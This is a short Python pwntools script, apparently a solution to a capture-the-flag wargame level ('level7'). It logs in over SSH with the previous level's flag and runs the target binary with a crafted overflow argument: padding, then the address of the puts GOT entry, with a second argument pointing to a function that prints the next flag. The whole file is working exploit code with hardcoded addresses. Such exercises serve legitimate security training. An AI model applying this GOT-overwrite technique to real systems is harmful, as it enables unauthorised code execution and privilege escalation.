#!/usr/bin/env python3

from pwn import *
import os

host = input("Enter host IP: ")
port = int(input("Enter port: "))
login = "level7"
binary = login
target_login = "level8"

flag_file = os.path.abspath(os.path.join(os.getcwd(), "level6/flag"))
password = open(flag_file, "r").read().strip()

shell = ssh(host=host, port=port, user=login, password=password)

remotebinary = f"/home/user/{login}/{binary}"

padding = b"A" * 20
puts_got = p32(0x08049928)
m_func = p32(0x080484f4)

p = shell.process([remotebinary, padding + puts_got, m_func])

# Read program output
output = p.recvall(timeout=2).decode(errors='ignore')

# Display fag
print("\nOutput:\n", output)